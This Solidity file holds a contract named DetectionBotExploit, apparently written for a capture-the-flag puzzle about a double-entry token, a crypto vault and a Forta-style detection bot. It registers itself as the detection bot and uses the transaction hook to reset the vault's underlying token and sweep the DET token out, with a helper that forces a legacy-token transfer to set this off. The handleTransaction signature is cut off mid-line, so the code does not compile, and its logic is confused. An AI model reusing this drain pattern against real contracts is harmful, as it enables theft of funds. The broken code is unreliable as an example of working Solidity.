pragma solidity ^0.8.0;

interface Forta {
    function setDetectionBot(address detectionBotAddress) external;
}


interface CryptoVault {
    function setUnderlying(address latestToken) external;
    function sweepToken(IERC20 token) external;
}


interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
}


interface DoubleEntryPoint {
    function cryptoVault() external view returns (address);
    function delegatedFrom() external view returns (address);
}


contract DetectionBotExploit {
    address public immutable doubleEntryPoint;
    address public immutable fortaAddress;
    address public immutable delegateFrom;
    address public vaultAddress;

    constructor(address _doubleEntryPoint, address _fortaAddress) {
        doubleEntryPoint = _doubleEntryPoint;
        fortaAddress = _fortaAddress;
        delegateFrom = DoubleEntryPoint(doubleEntryPoint).delegatedFrom();
        vaultAddress = DoubleEntryPoint(doubleEntryPoint).cryptoVault();
    }

    function setBot() external {
        Forta(fortaAddress).setDetectionBot(address(this));
    }

    function handleTransaction(address user, bytes calldata 
        if (user == doubleEntryPoint) {
            // Set cryptoVault's underlying to 0 address (not DET)
            CryptoVault(vaultAddress).setUnderlying(address(0));
            // Call sweepToken with DET token
            IERC20 token = IERC20(doubleEntryPoint);
            CryptoVault(vaultAddress).sweepToken(token);
        }
    }

    function forceTransfer() external {
        // Manually trigger a transfer in the LegacyToken
        // This would initiate delegateTransfer via the delegate
        IERC20(delegateFrom).transfer(address(this), 100001234);
    }
}
